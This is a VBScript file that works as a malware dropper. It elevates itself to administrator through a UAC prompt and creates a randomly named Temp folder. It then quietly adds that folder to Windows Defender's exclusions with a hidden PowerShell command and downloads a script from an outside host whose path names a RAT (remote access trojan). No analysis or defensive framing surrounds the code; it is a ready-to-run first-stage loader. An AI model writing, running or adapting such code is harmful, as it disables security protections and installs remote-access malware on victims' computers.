' Check if the script is running with administrative privileges
Set objShell = CreateObject("WScript.Shell")
Set objNetwork = CreateObject("WScript.Network")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Check if the current user is part of the Administrators group
strUser = objNetwork.UserName
strAdminGroup = "Administrators"

' Get the list of groups for the current user
Set objGroup = objShell.Exec("net localgroup " & strAdminGroup)

' Search if the user is part of the Administrators group
If InStr(objGroup.StdOut.ReadAll, strUser) = 0 Then
    ' If not admin, request elevated privileges
    objShell.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34), "", "runas", 1
    WScript.Quit
End If

' Create random directory name
Randomize
charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
dirName = ""

For i = 1 To 7
    dirName = dirName & Mid(charset, Int((Len(charset) * Rnd) + 1), 1)
Next

' Set target directory path (Temp folder)
targetDir = CreateObject("WScript.Shell").SpecialFolders("Temp") & "\" & dirName

' Create the directory
If Not objFSO.FolderExists(targetDir) Then
    objFSO.CreateFolder(targetDir)
End If

' Add Windows Defender exclusion path using PowerShell
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell -Command Add-MpPreference -ExclusionPath '" & targetDir & "'", 0, True

' Download the file (hello.vbs) using XMLHttpRequest
url = "https://arth.imbeddex.com/RAT/hello.vbs"
outputFile = targetDir & "\hello.vbs"

' Create XMLHttpRequest object
Set xhr = CreateObject("MSXML2.XMLHTTP")
xhr.Open "GET", url, False
xhr.Send

' Create ADODB stream to save the file
Set stream = CreateObject("ADODB.Stream")
stream.Type = 1 ' Binary
stream.Open
stream.Write xhr.ResponseBody
stream.SaveToFile outputFile, 2 ' Overwrite if the file exists
stream.Close

' Notify the user that the file has been downloaded
MsgBox "File downloaded successfully to: " & outputFile, vbInformation
